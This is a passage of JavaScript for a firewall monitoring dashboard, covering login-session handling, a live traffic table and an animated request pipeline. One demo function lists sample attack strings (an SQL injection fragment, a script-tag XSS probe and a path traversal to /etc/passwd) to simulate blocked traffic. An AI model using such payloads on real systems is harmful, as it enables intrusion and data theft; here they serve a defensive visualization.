
    function customNotify(title, msg, severity = 'info') {
      const toast = document.getElementById('threat-toast');
      if (!toast) return;
      const titleEl = document.getElementById('toast-title');
      const bodyEl = document.getElementById('toast-body');
      if (titleEl) titleEl.innerText = title;
      if (bodyEl) bodyEl.innerText = msg;
      toast.style.display = 'flex';
      setTimeout(() => { toast.style.display = 'none'; }, 4500);
    }
    let storedBackend = localStorage.getItem("sentinel_backend_url");
    if (storedBackend && (storedBackend.includes("localhost") || storedBackend.includes("127.0.0.1") || storedBackend.includes("onrender.com"))) {
      localStorage.removeItem("sentinel_backend_url");
      storedBackend = null;
    }
    const isLocalDevServer = window.location.hostname === "localhost" && (window.location.port === "8000" || window.location.port === "8080");
    const API = storedBackend || (isLocalDevServer ? "/v1" : "https://sentinelgrid-one.vercel.app/v1");

    // -------------------------------------------------------------------------
    // Session Authentication Guard & RBAC Initializer
    // -------------------------------------------------------------------------
    const authToken = localStorage.getItem("sg_auth_token");
    let currentUser = null;
    try {
      currentUser = JSON.parse(localStorage.getItem("sg_auth_user") || "null");
    } catch (_) {}

    // Redirect unauthenticated operators immediately to login
    if (!authToken || !currentUser) {
      window.location.replace("login.html");
    }

    function initUserSessionUI() {
      if (!currentUser) return;
      const nameEl = document.getElementById("user-display-name");
      const avatarEl = document.getElementById("user-avatar");
      const badgeEl = document.getElementById("user-role-badge");
      const topbarAvatar = document.getElementById("topbar-user-avatar");
      const topbarRole = document.getElementById("topbar-user-role");

      const displayName = currentUser.full_name || currentUser.email.split("@")[0];
      if (nameEl) nameEl.innerText = displayName;

      let initials = "OP";
      if (displayName) {
        const parts = displayName.trim().split(" ");
        initials = parts[0][0].toUpperCase();
        if (parts.length > 1) initials += parts[1][0].toUpperCase();
        else if (displayName.length > 1) initials += displayName[1].toUpperCase();
      }
      if (avatarEl) avatarEl.innerText = initials;
      if (topbarAvatar) topbarAvatar.innerText = initials;

      const role = (currentUser.role || "member").toUpperCase();
      if (badgeEl) {
        badgeEl.innerText = role;
        badgeEl.className = "role-badge";
        if (role === "MANAGER") badgeEl.classList.add("badge-manager");
        else if (role === "TEAM_LEADER") badgeEl.classList.add("badge-team-leader");
        else badgeEl.classList.add("badge-member");
      }
      if (topbarRole) topbarRole.innerText = role;
    }

    async function handleLogout() {
      const token = localStorage.getItem("sg_auth_token");
      try {
        if (token) {
          await fetch(`${API}/auth/logout`, {
            method: "POST",
            headers: { "Authorization": `Bearer ${token}` }
          });
        }
      } catch (_) {}
      try {
        if (typeof SentinelEventStore !== "undefined" && SentinelEventStore.clear) {
          await SentinelEventStore.clear();
        }
      } catch (_) {}
      localStorage.removeItem("sg_stored_events_24h");
      localStorage.removeItem("sg_auth_token");
      localStorage.removeItem("sg_auth_user");
      window.location.replace("login.html");
    }

    // -------------------------------------------------------------------------
    // Collapsible Left-Slide Sidebar Controller & Responsive Mobile Drawer
    // -------------------------------------------------------------------------
    function toggleSidebarCollapse() {
      const sidebar = document.getElementById("appSidebar");
      const arrowIcon = document.getElementById("collapse-arrow-icon");
      const backdrop = document.getElementById("sidebarBackdrop");
      if (!sidebar) return;

      if (window.innerWidth <= 900) {
        const isOpen = sidebar.classList.toggle("mobile-open");
        if (backdrop) backdrop.classList.toggle("active", isOpen);
      } else {
        const isCollapsed = sidebar.classList.toggle("collapsed");
        localStorage.setItem("sg_sidebar_collapsed", isCollapsed ? "true" : "false");
        if (arrowIcon) {
          arrowIcon.innerText = isCollapsed ? "▶" : "◀";
        }
      }
    }

    function initSidebarState() {
      const savedCollapsed = localStorage.getItem("sg_sidebar_collapsed") === "true";
      const sidebar = document.getElementById("appSidebar");
      const arrowIcon = document.getElementById("collapse-arrow-icon");
      if (sidebar && savedCollapsed && window.innerWidth > 900) {
        sidebar.classList.add("collapsed");
        if (arrowIcon) arrowIcon.innerText = "▶";
      }
    }

    // -------------------------------------------------------------------------
    // Operator Profile & Clearance HUD Modal
    // -------------------------------------------------------------------------
    function openUserProfileModal() {
      const modal = document.getElementById("user-profile-modal");
      const backdrop = document.getElementById("user-profile-backdrop");
      if (!modal || !backdrop) return;

      const user = currentUser || JSON.parse(localStorage.getItem("sg_auth_user") || "{}");
      const token = localStorage.getItem("sg_auth_token") || "No Active Token";

      const nameEl = document.getElementById("prof-modal-name");
      const emailEl = document.getElementById("prof-modal-email");
      const avatarEl = document.getElementById("prof-modal-avatar");
      const roleBadge = document.getElementById("prof-modal-role");
      const clearanceEl = document.getElementById("prof-modal-clearance");
      const capsEl = document.getElementById("prof-modal-capabilities");
      const tokenInput = document.getElementById("prof-modal-token");

      const fullName = user.full_name || "Enterprise Operator";
      if (nameEl) nameEl.innerText = fullName;
      if (emailEl) emailEl.innerText = user.email || "operator@sentinelgrid.io";

      if (avatarEl) {
        const parts = fullName.trim().split(" ");
        let initials = parts[0][0].toUpperCase();
        if (parts.length > 1) initials += parts[1][0].toUpperCase();
        else if (fullName.length > 1) initials += fullName[1].toUpperCase();
        avatarEl.innerText = initials;
      }

      const role = (user.role || "member").toLowerCase();
      if (roleBadge) {
        roleBadge.innerText = role.toUpperCase();
        roleBadge.className = "role-badge";
        if (role === "manager") roleBadge.classList.add("badge-manager");
        else if (role === "team_leader") roleBadge.classList.add("badge-team-leader");
        else roleBadge.classList.add("badge-member");
      }

      if (clearanceEl && capsEl) {
        if (role === "manager") {
          clearanceEl.innerText = "TIER 1 (FULL GOVERNANCE)";
          clearanceEl.style.color = "#818CF8";
          capsEl.innerHTML = "✔ Ed25519 Policy Signing & Rollback<br>✔ Domain Onboarding & Deletion<br>✔ Permanent IP Quarantine / Whitelist<br>✔ User Provisioning & Fleet Telemetry";
        } else if (role === "team_leader") {
          clearanceEl.innerText = "TIER 2 (SUPERVISOR)";
          clearanceEl.style.color = "#FBBF24";
          capsEl.innerHTML = "✔ Policy Simulation & Dry-Run Engine<br>✔ Temporary IP Quarantine (15m/1h)<br>✔ OpenAPI Schema Ingestion<br>✔ Full Observability & Incident Audit";
        } else {
          clearanceEl.innerText = "TIER 3 (READ-ONLY OBSERVER)";
          clearanceEl.style.color = "#34D399";
          capsEl.innerHTML = "✔ Real-Time Traffic Stream Inspection<br>✔ Security Event Forensics<br>✔ WAF Sandbox Attack Diagnostics<br>✖ Policy Modification Restricted";
        }
      }

      if (tokenInput) tokenInput.value = token;

      backdrop.classList.add("active");
      modal.style.display = "block";
    }

    function closeUserProfileModal() {
      const modal = document.getElementById("user-profile-modal");
      const backdrop = document.getElementById("user-profile-backdrop");
      if (modal) modal.style.display = "none";
      if (backdrop) backdrop.classList.remove("active");
    }

    function copySessionToken() {
      const tokenInput = document.getElementById("prof-modal-token");
      if (tokenInput) {
        navigator.clipboard.writeText(tokenInput.value);
        showThreatToast("Token Copied", "Session bearer token copied to clipboard.");
      }
    }

    // -------------------------------------------------------------------------
    // Contextual Telemetry HUD (1.2s–3.0s Cursor Hold Inspector)
    // -------------------------------------------------------------------------
    let hudHoldTimer = null;

    function initContextualHoverInspection() {
      const hud = document.getElementById("contextualTelemetryHud");
      if (!hud) return;

      document.addEventListener("mouseover", (e) => {
        const target = e.target.closest("[data-telemetry-hud]");
        if (!target) return;

        const hudType = target.getAttribute("data-telemetry-hud");
        const hudId = target.getAttribute("data-telemetry-id") || "";

        if (hudHoldTimer) clearTimeout(hudHoldTimer);

        hudHoldTimer = setTimeout(() => {
          renderContextualHud(target, hudType, hudId);
        }, 1200);
      });

      document.addEventListener("mouseout", (e) => {
        const target = e.target.closest("[data-telemetry-hud]");
        if (target) {
          if (hudHoldTimer) clearTimeout(hudHoldTimer);
          if (hud) hud.style.display = "none";
        }
      });
    }

    function renderContextualHud(element, type, id) {
      const hud = document.getElementById("contextualTelemetryHud");
      if (!hud) return;
      const rect = element.getBoundingClientRect();
      const titleEl = document.getElementById("hudTitle");
      const bodyEl = document.getElementById("hudContent");
      const badgeEl = document.getElementById("hudStatusBadge");

      if (type === "pipeline-card") {
        titleEl.innerText = "IN-LINE WAAP PIPELINE";
        badgeEl.innerText = "ACTIVE :8080";
        bodyEl.innerHTML = `
          <div class="hud-stat-row"><span>Engine:</span><strong>SmartParse Lexical DFA v2.4</strong></div>
          <div class="hud-stat-row"><span>P99 Latency:</span><strong style="color:var(--deep-indigo);">0.35 ms</strong></div>
          <div class="hud-stat-row"><span>Verification:</span><strong style="color:var(--sage-green);">Ed25519 Signed</strong></div>
          <div class="hud-stat-row"><span>Mitigation:</span><strong>Sliding Window RateLimiter</strong></div>
        `;
      } else if (type === "scope-selector") {
        titleEl.innerText = "ACTIVE DOMAIN SCOPE";
        badgeEl.innerText = "MULTI-TENANT";
        bodyEl.innerHTML = `
          <div class="hud-stat-row"><span>Current Scope:</span><strong>${escapeHtml(currentDomainScope)}</strong></div>
          <div class="hud-stat-row"><span>Filter Mode:</span><strong>Strict Per-Site Partitioning</strong></div>
          <div class="hud-stat-row"><span>Telemetry:</span><strong style="color:var(--sage-green);">Synchronized</strong></div>
        `;
      } else if (type === "client-ip") {
        titleEl.innerText = `IP FORENSICS: ${id || 'EDGE'}`;
        badgeEl.innerText = "RADIX LPM";
        bodyEl.innerHTML = `
          <div class="hud-stat-row"><span>Classification:</span><strong>External Edge Client</strong></div>
          <div class="hud-stat-row"><span>Inspection:</span><strong style="color:var(--sage-green);">Continuous L7 Tracking</strong></div>
          <div class="hud-stat-row"><span>Radix Trie:</span><strong>Zero-Allocation Match</strong></div>
        `;
      } else {
        titleEl.innerText = "TELEMETRY INSPECTION";
        badgeEl.innerText = "LIVE";
        bodyEl.innerHTML = `
          <div class="hud-stat-row"><span>Component:</span><strong>${escapeHtml(type)}</strong></div>
          <div class="hud-stat-row"><span>Status:</span><strong style="color:var(--sage-green);">Operational</strong></div>
        `;
      }

      let left = rect.right + 12;
      let top = rect.top - 10;
      if (left + 330 > window.innerWidth) left = rect.left - 335;
      if (top + 160 > window.innerHeight) top = window.innerHeight - 170;

      hud.style.left = `${Math.max(10, left)}px`;
      hud.style.top = `${Math.max(10, top)}px`;
      hud.style.display = "block";
    }

    // -------------------------------------------------------------------------
    // Native Live Traffic Stream & SSE Controller with Edge Polling Fallback
    // -------------------------------------------------------------------------
    let liveTrafficBuffer = [];
    let liveTrafficEventSource = null;
    let liveTrafficPollingInterval = null;
    let isLiveTrafficPaused = false;
    let liveTrafficFilter = "ALL";

    function startLiveTrafficPollingFallback() {
      if (liveTrafficPollingInterval) return;
      liveTrafficPollingInterval = setInterval(async () => {
        if (isLiveTrafficPaused) return;
        try {
          const res = await fetch(`${API}/overview`);
          if (!res.ok) return;
          const data = await res.json();
          const events = data.recent_events || [];
          if (events.length > 0) {
            const existingIds = new Set(liveTrafficBuffer.map(x => x.id));
            const newEvents = events.filter(x => !existingIds.has(x.id));
            newEvents.reverse().forEach(ev => {
              if (typeof dispatchLivePacketToPipeline === "function") {
                dispatchLivePacketToPipeline(ev);
              }
              if (ev.action === "BLOCK") {
                recordBlockedNotification(ev);
              }
              prependLiveTrafficEvent(ev);
            });
          }
        } catch (_) {}
      }, 3000);
    }

    function initLiveTrafficSSE() {
      loadInitialLiveTraffic();
      startLiveTrafficPollingFallback();

      if (liveTrafficEventSource) return;

      try {
        liveTrafficEventSource = new EventSource(`${API}/events/stream`);

        liveTrafficEventSource.onmessage = (e) => {
          if (isLiveTrafficPaused) return;
          try {
            const ev = JSON.parse(e.data);
            if (ev.type === "init") return;
            if (typeof dispatchLivePacketToPipeline === "function") {
              dispatchLivePacketToPipeline(ev);
            }
            if (ev.action === "BLOCK") {
              recordBlockedNotification(ev);
            }
            prependLiveTrafficEvent(ev);
          } catch (err) {
            console.error("SSE parse error:", err);
          }
        };

        liveTrafficEventSource.onerror = () => {
          console.warn("SSE connection closed or suspended, dynamic polling fallback active.");
        };
      } catch (err) {
        console.warn("Failed to instantiate EventSource:", err);
      }
    }

    async function loadInitialLiveTraffic() {
      try {
        if (typeof SentinelEventStore !== "undefined") {
          const stored = await SentinelEventStore.getAll();
          if (stored && stored.length > 0) {
            liveTrafficBuffer = [...stored];
            renderLiveTrafficTable();
          }
        }
        const res = await fetch(`${API}/overview`);
        if (res.ok) {
          const data = await res.json();
          const events = data.recent_events || [];
          if (events.length > 0 && typeof SentinelEventStore !== "undefined") {
            await SentinelEventStore.putBatch(events);
            const merged = await SentinelEventStore.getAll();
            liveTrafficBuffer = [...merged];
            renderLiveTrafficTable();
          }
        }
      } catch (err) {
        console.error("Failed to load initial live traffic:", err);
      }
    }

    function toggleLiveTrafficWideView() {
      const isWide = document.body.classList.toggle("livetraffic-wide-mode");
      const btn = document.getElementById("livetraffic-wide-btn");
      if (btn) {
        btn.innerHTML = isWide
          ? `<svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 14h6m0 0v6m0-6L3 21m17-7h-6m0 0v6m0-6l7 7M4 10h6m0 0V4m0 6L3 3m17 7h-6m0 0V4m0 6l7-7"/></svg><span>Standard View</span><kbd style="font-size: 9px; opacity: 0.6; padding: 1px 4px; border: 1px solid var(--stone-border); border-radius: 3px; font-family: var(--font-mono);">W</kbd>`
          : `<svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M15 3h6v6M9 21H3v-6M21 3l-7 7M3 21l7-7"/></svg><span>Wide View</span><kbd style="font-size: 9px; opacity: 0.6; padding: 1px 4px; border: 1px solid var(--stone-border); border-radius: 3px; font-family: var(--font-mono);">W</kbd>`;
      }
      localStorage.setItem("sg_livetraffic_wide", isWide ? "true" : "false");
    }

    function toggleLiveTrafficStream() {
      isLiveTrafficPaused = !isLiveTrafficPaused;
      const btn = document.getElementById("livetraffic-pause-btn");
      if (btn) {
        btn.innerHTML = isLiveTrafficPaused
          ? `<svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="5 3 19 12 5 21 5 3"/></svg><span>Resume</span><kbd style="font-size: 9px; opacity: 0.6; padding: 1px 4px; border: 1px solid var(--stone-border); border-radius: 3px; font-family: var(--font-mono);">Space</kbd>`
          : `<svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="6" y="4" width="4" height="16"/><rect x="14" y="4" width="4" height="16"/></svg><span>Pause</span><kbd style="font-size: 9px; opacity: 0.6; padding: 1px 4px; border: 1px solid var(--stone-border); border-radius: 3px; font-family: var(--font-mono);">Space</kbd>`;
      }
    }

    function clearLiveTrafficBuffer() {
      if (confirm("Clear in-memory view buffer? Stored 24h events remain safe in local container until explicit logout.")) {
        liveTrafficBuffer = [];
        renderLiveTrafficTable();
      }
    }

    function applyLiveTrafficFilter() {
      const select = document.getElementById("livetraffic-verdict-filter");
      if (select) liveTrafficFilter = select.value;
      renderLiveTrafficTable();
    }

    function prependLiveTrafficEvent(ev) {
      if (!ev || !ev.id) return;
      if (typeof SentinelEventStore !== "undefined") {
        SentinelEventStore.putBatch([ev]);
      }
      if (!allRecentEvents.some(e => e.id === ev.id)) {
        allRecentEvents.unshift(ev);
        updateContainerBadge(allRecentEvents.length);
      }
      if (!liveTrafficBuffer.some(e => e.id === ev.id)) {
        liveTrafficBuffer.unshift(ev);
      }
      if (liveTrafficBuffer.length > 500) liveTrafficBuffer.pop();

      if (liveTrafficFilter === "ALL" || ev.action === liveTrafficFilter) {
        const tbody = document.getElementById("livetraffic-table-body");
        if (tbody) {
          if (tbody.children.length === 1 && tbody.children[0].innerText.includes("Connecting to")) {
            tbody.innerHTML = "";
          }
          const tr = document.createElement("tr");
          tr.className = "clickable-row";
          tr.onclick = () => openEventForensics(ev.id);
          tr.innerHTML = formatLiveTrafficRowHtml(ev);
          tbody.insertBefore(tr, tbody.firstChild);
          if (tbody.children.length > 500) {
            tbody.removeChild(tbody.lastChild);
          }
        }
      }
      updateLiveTrafficBadge();
    }

    function renderLiveTrafficTable() {
      const tbody = document.getElementById("livetraffic-table-body");
      if (!tbody) return;

      const filtered = liveTrafficFilter === "ALL" 
        ? liveTrafficBuffer 
        : liveTrafficBuffer.filter(ev => ev.action === liveTrafficFilter);

      if (filtered.length === 0) {
        tbody.innerHTML = `<tr><td colspan="8" style="text-align: center; color: var(--text-muted); padding: 48px;">No live traffic events match filter "${escapeHtml(liveTrafficFilter)}".</td></tr>`;
      } else {
        tbody.innerHTML = filtered.map(ev => `
          <tr class="clickable-row" onclick="openEventForensics('${escapeHtml(ev.id)}')">
            ${formatLiveTrafficRowHtml(ev)}
          </tr>
        `).join("");
      }
      updateLiveTrafficBadge();
    }

    function formatLiveTrafficRowHtml(ev) {
      const ts = formatTimestamp(ev.timestamp);
      const safeAction = escapeHtml(ev.action);
      let badgeClass = ev.action === 'BLOCK' ? 'badge-block' : (ev.action === 'CHALLENGE' ? 'badge-challenge' : 'badge-allow');
      const safeMethod = escapeHtml(ev.method || 'GET');
      const safePath = escapeHtml(ev.path || '/');
      const safeIp = escapeHtml(ev.client_ip || '127.0.0.1');
      const safeRule = escapeHtml(ev.rule_triggered || 'CLEAN-TRAFFIC');
      const safeScore = Number(ev.risk_score) || 0;

      const isReOffender = ev.rule_triggered === "ALREADY-BLOCKED-REACH-ATTEMPT" || 
                           (ev.details && ev.details.includes("QUARANTINED OFFENDER RE-ATTEMPT"));

      let verdictBadge = `<span class="badge ${badgeClass}">${safeAction}</span>`;
      let ruleDisplay = `<span style="color: ${ev.action === 'BLOCK' ? 'var(--terracotta)' : 'var(--sage-green)'}; font-weight: 600; font-size: 11px; font-family: var(--font-mono);">${safeRule}</span>`;

      if (isReOffender) {
        verdictBadge = `<span class="badge" style="background: rgba(156, 42, 27, 0.12); border: 1px solid var(--terracotta); color: var(--terracotta); font-weight: 800; font-family: var(--font-mono); font-size: 10px; letter-spacing: 0.5px; padding: 3px 8px;">BLOCKED IP RE-ATTEMPT</span>`;
        ruleDisplay = `
          <div>
            <div style="color: var(--terracotta); font-weight: 800; font-size: 11px; font-family: var(--font-mono); display: flex; align-items: center; gap: 5px;">
              <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><circle cx="12" cy="12" r="10"/><line x1="4.93" y1="4.93" x2="19.07" y2="19.07"/></svg>
              <span>QUARANTINED OFFENDER RE-ATTEMPT</span>
            </div>
            <div style="font-size: 10px; color: var(--text-muted); font-family: var(--font-mono); margin-top: 2px;">
              Firewall active drop &bull; Zero origin execution
            </div>
          </div>
        `;
      }

      return `
        <td style="color: var(--text-muted); font-family: var(--font-mono); font-size: 11px; white-space: nowrap;">${ts.time}</td>
        <td>${verdictBadge}</td>
        <td><span style="font-weight: 700; font-family: var(--font-mono); color: var(--deep-indigo);">${safeMethod}</span></td>
        <td><code style="color: var(--text-charcoal); background: var(--sand-warm); padding: 3px 8px; border-radius: var(--radius-xs); font-size: 11px;">${safePath}</code></td>
        <td style="color: var(--deep-indigo); font-family: var(--font-mono); font-size: 11px; font-weight: 700;" data-telemetry-hud="client-ip" data-telemetry-id="${safeIp}">${safeIp}</td>
        <td>${ruleDisplay}</td>
        <td style="font-weight: 700; font-family: var(--font-mono); color: ${safeScore > 70 ? 'var(--terracotta)' : 'var(--sage-green)'};">${safeScore.toFixed(1)}</td>
        <td><button class="btn btn-subtle" style="padding: 2px 8px; font-size: 10px;" onclick="event.stopPropagation(); openEventForensics('${escapeHtml(ev.id)}')">Inspect</button></td>
      `;
    }

    function updateLiveTrafficBadge() {
      const badge = document.getElementById("livetraffic-count-badge");
      if (badge) badge.innerText = `${liveTrafficBuffer.length} requests buffered`;
    }

    // -------------------------------------------------------------------------
    // REAL-TIME 3D IN-LINE WAAP PIPELINE ENGINE (LIVE TRAFFIC SYNCHRONIZED)
    // -------------------------------------------------------------------------
    let particleAnimationId = null;
    let particleSpeedMultiplier = 2.0;
    let isParticleStreamActive = true;
    const particles = [];
    const explosionSparks = [];
    const floatingBadges = [];

    let pipelineTotalCount = 0;
    let pipelinePassedCount = 0;
    let pipelineDestroyedCount = 0;

    const PIPELINE_NODES = [
      {
        id: "ingress",
        label: "Client Ingress",
        sublabel: "Untrusted Edge Traffic",
        badge: "TLS 1.3 / EDGE",
        xRatio: 0.12,
        yRatio: 0.50,
        radius: 26,
        color: "#38BDF8",
        glow: "rgba(56, 189, 248, 0.4)",
        desc: "Edge TLS termination & HTTP connection pool receiving live client requests.",
        telemetry: { status: "ACTIVE", rps: "Live Ingress", transport: "TLS 1.3" }
      },
      {
        id: "waap",
        label: "SentinelGrid WAAP",
        sublabel: "In-Process Zero-Trust Gate",
        badge: "SMARTPARSE AST",
        xRatio: 0.50,
        yRatio: 0.50,
        radius: 36,
        color: "#818CF8",
        glow: "rgba(129, 140, 248, 0.5)",
        pulseRadius: 0,
        pulseColor: null,
        desc: "Lexical AST analysis, IP access rules, rate limiter & Ed25519 signature enforcement.",
        telemetry: { status: "PROTECTED", p99: "0.35ms", engine: "Sub-1.5ms" }
      },
      {
        id: "origin",
        label: "Protected Origin",
        sublabel: "Healthy Upstream Service",
        badge: "HTTP 200 PASS",
        xRatio: 0.88,
        yRatio: 0.28,
        radius: 26,
        color: "#22C55E",
        glow: "rgba(34, 197, 94, 0.45)",
        pulseRadius: 0,
        pulseColor: null,
        desc: "Sanitized clean requests forwarded safely to origin applications.",
        telemetry: { status: "ONLINE", upstream: "agispro.vercel.app", state: "CLEAN" }
      },
      {
        id: "quarantine",
        label: "Threat Quarantine",
        sublabel: "Mitigated Attack Sinkhole",
        badge: "403 DESTROYED",
        xRatio: 0.88,
        yRatio: 0.72,
        radius: 26,
        color: "#EF4444",
        glow: "rgba(239, 68, 68, 0.5)",
        pulseRadius: 0,
        pulseColor: null,
        desc: "Exploits (SQLi, XSS, BOLA, RCE) deflected and destroyed with forensics.",
        telemetry: { status: "CONTAINING", trap: "Dynamic Tarpit", mitigation: "100.0%" }
      }
    ];

    function setParticleSpeed(val) {
      particleSpeedMultiplier = parseFloat(val) || 2.0;
    }

    function toggleParticleStream() {
      isParticleStreamActive = !isParticleStreamActive;
      const btn = document.getElementById("canvas-pause-btn");
      if (btn) btn.innerText = isParticleStreamActive ? "⏸️ Pause 3D" : "▶️ Resume 3D";
    }

    let lastDispatchedPacketTime = Date.now();

    /**
     * Dispatches a real, live HTTP request into the 3D pipeline visualization
     */
    function dispatchLivePacketToPipeline(ev) {
      lastDispatchedPacketTime = Date.now();
      if (!isParticleStreamActive) return;
      const isBlock = ev.action === "BLOCK";
      
      pipelineTotalCount++;
      if (isBlock) pipelineDestroyedCount++;
      else pipelinePassedCount++;

      // Update HUD counters
      const totEl = document.getElementById("pipeline-stat-total");
      const passEl = document.getElementById("pipeline-stat-passed");
      const destEl = document.getElementById("pipeline-stat-destroyed");
      if (totEl) totEl.innerText = pipelineTotalCount.toLocaleString();
      if (passEl) passEl.innerText = pipelinePassedCount.toLocaleString();
      if (destEl) destEl.innerText = pipelineDestroyedCount.toLocaleString();

      const method = ev.method || "GET";
      const path = ev.path || "/";
      const rule = ev.rule_triggered || (isBlock ? "THREAT" : "CLEAN");

      // Spawn live packet particle
      particles.push({
        leg: 0,
        t: 0,
        speed: (0.008 + Math.random() * 0.003) * particleSpeedMultiplier,
        isThreat: isBlock,
        method: method,
        label: `${method} ${path.slice(0, 14)}`,
        rule: rule,
        size: isBlock ? 4.5 : 3.6,
        trail: []
      });
    }

    function triggerSimulatedThreatWave() {
      showToast("🚨 Attack Wave Injected: 25 exploit packets dispatched to live 3D pipeline!", "error");
      const attacks = [
        { path: "/api/users?id=1' UNION SELECT", rule: "SQLI-UNION-SELECT" },
        { path: "/search?q=<script>alert(1)", rule: "XSS-INJECTION" },
        { path: "/../../etc/passwd", rule: "PATH-TRAVERSAL" },
        { path: "/admin/roles", rule: "BOLA-IDOR" },
        { path: "/oauth/token", rule: "AUTH-BYPASS" }
      ];
      for (let i = 0; i < 25; i++) {
        const atk = attacks[i % attacks.length];
        setTimeout(() => {
          dispatchLivePacketToPipeline({
            action: "BLOCK",
            method: "POST",
            path: atk.path,
            rule_triggered: atk.rule
          });
        }, i * 75);
      }
    }

    function initInteractive3DPipeline() {
      const canvas = document.getElementById("interactive-3d-pipeline-canvas");
      const card = document.getElementById("topology3dCard");
      const hud = document.getElementById("canvas-node-hud");
      if (!canvas || !card) return;

      const ctx = canvas.getContext("2d");

      function resizePipelineCanvas() {
        const rect = canvas.getBoundingClientRect();
        if (rect.width > 0) {
          canvas.width = rect.width;
          canvas.height = 220;
        }
      }
      window.addEventListener("resize", resizePipelineCanvas);
      window.addEventListener("orientationchange", () => setTimeout(resizePipelineCanvas, 150));
      resizePipelineCanvas();

      // Touch inspection support for mobile screens
      canvas.addEventListener("touchstart", (e) => {
        if (e.touches && e.touches[0]) {
          const t = e.touches[0];
          const fake = new MouseEvent("mousemove", { clientX: t.clientX, clientY: t.clientY });
          canvas.dispatchEvent(fake);
        }
      }, { passive: true });
      canvas.addEventListener("touchmove", (e) => {
        if (e.touches && e.touches[0]) {
          const t = e.touches[0];
          const fake = new MouseEvent("mousemove", { clientX: t.clientX, clientY: t.clientY });
          canvas.dispatchEvent(fake);
        }
      }, { passive: true });
      canvas.addEventListener("touchend", () => {
        if (hud) hud.style.display = "none";
      }, { passive: true });

      // Stationary hardware alignment (Zero 3D perspective tilt)
      card.style.transform = "none";
      card.addEventListener("mouseleave", () => {
        if (hud) hud.style.display = "none";
      });
      // Mouse Hover HUD on Canvas Nodes
      canvas.addEventListener("mousemove", (e) => {
        if (!hud) return;
        const rect = canvas.getBoundingClientRect();
        const scaleX = canvas.width / rect.width;
        const scaleY = canvas.height / rect.height;
        const mouseX = (e.clientX - rect.left) * scaleX;
        const mouseY = (e.clientY - rect.top) * scaleY;

        let hovered = null;
        for (const n of PIPELINE_NODES) {
          const nx = n.xRatio * canvas.width;
          const ny = n.yRatio * canvas.height;
          const dist = Math.hypot(mouseX - nx, mouseY - ny);
          if (dist <= n.radius + 8) {
            hovered = n;
            break;
          }
        }

        if (hovered) {
          hud.style.display = "block";
          hud.style.left = `${Math.min(rect.width - 240, Math.max(10, e.clientX - rect.left + 15))}px`;
          hud.style.top = `${Math.min(rect.height - 110, Math.max(10, e.clientY - rect.top - 20))}px`;
          hud.innerHTML = `
            <div style="font-weight: 800; color: ${hovered.color}; margin-bottom: 4px; display: flex; justify-content: space-between; align-items: center;">
              <span>${escapeHtml(hovered.label)}</span>
              <span style="font-size: 9px; padding: 2px 6px; background: rgba(255,255,255,0.1); border-radius: var(--radius-pill);">${hovered.badge}</span>
            </div>
            <div style="font-size: 10px; color: #CBD5E1; margin-bottom: 6px;">${escapeHtml(hovered.desc)}</div>
            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 4px; font-size: 9px; border-top: 1px solid rgba(255,255,255,0.1); padding-top: 4px;">
              ${Object.entries(hovered.telemetry).map(([k, v]) => `<div><span style="color:#94A3B8;">${k.toUpperCase()}:</span> <strong>${escapeHtml(v)}</strong></div>`).join("")}
            </div>
          `;
        } else {
          hud.style.display = "none";
        }
      });

      function evalCubicBezier(p0, p1, p2, p3, t) {
        const u = 1 - t;
        const tt = t * t;
        const uu = u * u;
        const uuu = uu * u;
        const ttt = tt * t;
        return {
          x: uuu * p0.x + 3 * uu * t * p1.x + 3 * u * tt * p2.x + ttt * p3.x,
          y: uuu * p0.y + 3 * uu * t * p1.y + 3 * u * tt * p2.y + ttt * p3.y
        };
      }

      function spawnBaseParticle() {
        if (!isParticleStreamActive) return;
        const isThreat = Math.random() < 0.20;
        particles.push({
          leg: 0,
          t: 0,
          speed: (0.005 + Math.random() * 0.003) * particleSpeedMultiplier,
          isThreat: isThreat,
          size: isThreat ? 4.0 : 3.2,
          label: isThreat ? "PROBE /api" : "GET /",
          trail: []
        });
      }

      let lastSpawn = 0;
      function render(now) {
        if (now - lastSpawn > (160 / particleSpeedMultiplier)) {
          if (particles.length < 5) spawnBaseParticle();
          lastSpawn = now;
        }

        const W = canvas.width;
        const H = canvas.height;

        const isDark = document.documentElement.getAttribute("data-theme") !== "light";
        ctx.fillStyle = isDark ? "#0D1117" : "#F7F6F2";
        ctx.fillRect(0, 0, W, H);

        // Draw 3D Isometric Grid Floor
        ctx.strokeStyle = isDark ? "rgba(255, 255, 255, 0.03)" : "rgba(0, 0, 0, 0.03)";
        ctx.lineWidth = 1;
        const step = 28;
        for (let x = 0; x < W; x += step) {
          ctx.beginPath();
          ctx.moveTo(x, 0);
          ctx.lineTo(x, H);
          ctx.stroke();
        }
        for (let y = 0; y < H; y += step) {
          ctx.beginPath();
          ctx.moveTo(0, y);
          ctx.lineTo(W, y);
          ctx.stroke();
        }

        const nodes = {};
        for (const n of PIPELINE_NODES) {
          nodes[n.id] = {
            ...n,
            x: n.xRatio * W,
            y: n.yRatio * H
          };
        }

        const paths = [
          // Leg 0: Ingress -> WAAP
          {
            p0: { x: nodes.ingress.x + nodes.ingress.radius, y: nodes.ingress.y },
            p1: { x: (nodes.ingress.x + nodes.waap.x) / 2, y: nodes.ingress.y },
            p2: { x: (nodes.ingress.x + nodes.waap.x) / 2, y: nodes.waap.y },
            p3: { x: nodes.waap.x - nodes.waap.radius, y: nodes.waap.y },
            color: isDark ? "rgba(56, 189, 248, 0.25)" : "rgba(2, 132, 199, 0.25)"
          },
          // Leg 1: WAAP -> Origin (Passed)
          {
            p0: { x: nodes.waap.x + nodes.waap.radius, y: nodes.waap.y - 8 },
            p1: { x: nodes.waap.x + (nodes.origin.x - nodes.waap.x) * 0.45, y: nodes.waap.y - 12 },
            p2: { x: nodes.origin.x - (nodes.origin.x - nodes.waap.x) * 0.45, y: nodes.origin.y },
            p3: { x: nodes.origin.x - nodes.origin.radius, y: nodes.origin.y },
            color: isDark ? "rgba(34, 197, 94, 0.3)" : "rgba(5, 150, 105, 0.3)"
          },
